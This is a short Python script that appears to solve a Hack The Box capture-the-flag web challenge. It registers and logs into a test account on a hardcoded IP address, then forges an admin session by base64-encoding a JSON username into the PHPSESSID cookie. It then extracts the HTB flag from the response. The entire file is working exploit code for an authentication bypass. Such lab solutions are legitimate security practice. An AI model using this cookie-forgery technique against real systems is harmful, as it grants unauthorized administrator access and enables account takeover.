import requests
import re
from urllib.parse import unquote
import base64

host, port = "94.237.55.96", 33025

url = f"http://{host}:{port}"

session = requests.Session()

#create account
credentials = {
        "username":"test2",
        "password":"test2"
    }
response = session.post(f"{url}/auth/register",data=credentials)

#login
login_response = session.post(f"{url}/auth/login",data=credentials)

#set new cookie
new_cookie = '{"username":"admin"}'
#change text for bytes
new_cookie_bytes = new_cookie.encode("utf-8")
#return byte object b'eyJ1c2VybmFtZSI6ImFkbWluIn0=' // convert bytes -> string
encoded_cookie = base64.b64encode(new_cookie_bytes).decode("utf-8")
print(f"New cookie: {encoded_cookie}")

#don't use port for set new cookie, cookie is assigned to domain
session.cookies.set("PHPSESSID",encoded_cookie,domain="94.237.55.96")
new_response = session.get(f"{url}")

flag = re.search(r'HTB\{.*\}',new_response.text)

print(flag.group(0))

